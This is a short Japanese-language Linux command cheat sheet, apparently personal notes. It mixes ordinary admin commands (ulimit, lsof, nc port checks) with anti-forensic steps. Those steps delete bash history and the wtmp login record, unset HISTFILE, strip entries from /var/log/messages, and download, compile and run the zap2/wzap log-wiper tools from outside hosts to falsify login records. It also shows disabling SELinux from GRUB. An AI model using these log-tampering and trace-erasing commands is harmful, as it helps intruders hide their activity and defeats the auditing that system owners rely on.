## 履歴削除

```
sudo rm /var/log/wtmp
sudo touch /var/log/wtmp
sudo rm /root/.bash_history
sudo rm /root/.viminfo
rm ~/.bash_history
rm ~/.viminfo
unset HISTFILE
```

### ログ

 ファイル名 | ログの用途                     | 主な格納先 | 格納タイプ
------------|--------------------------------|------------|------------
 utmp       | 現在のユーザー情報を記録       | /var/run   | バイナリ
 wtmp       | ログインの履歴を記録           | /var/log   | バイナリ
 lastlog    | ユーザーの最終ログイン時を記録 | /var/log   | バイナリ
 cron       | cronの実行結果を保存           | /var/log   | テキスト
 maillog    | メール関連                     | /var/log   | テキスト
 messages   | システムメッセージ、各種ソフト | /var/log   | テキスト
 secure     | セキュリティ関連               | /var/log   | テキスト
 xferlog    | ftp関連                        | /var/log   | テキスト

#### 改ざん

```
# テキスト系ファイルの改ざん
sed -e '/hogehoge/d' /var/log/messages > /tmp/messages

# zap2 で wtmp を改ざん
cd /tmp/
curl -LO http://www.kozupon.pgw.jp/download/wzap.c
gcc -o wzap wzap.c
./wzap
who ./wtmp.out
mv -f wtmp.out wtmp
chown root.utmp wtmp

# zap
curl -LO www.ussrback.com/UNIX/penetration/log-wipers/zap2.c
gcc -o zap zap2.c
./zap
```


## GRUB からselinux をOFFに

```
selinux=0 single
```
## システムリソースの上限を確認 (ulimit -a)

```
ulimit -a
# max memory size    = 物理メモリの使用サイズ上限
# open files         = ファイルディスクリプタ数の上限
# cpu time           = CPU時間の上限
# max user processes = プロセス数の上限
```

## ポートを使用しているプロセスを調査 (lsof)

```
sudo lsof -i:3306
```

## 疎通確認

```
## TCP 80
nc -z -w 5 -v www.example.com 80
## TCP 80-81
nc -z -w 5 -v www.example.com 80-81
## UDP 68
nc -u -z -w 5 -v www.example.com 68
```
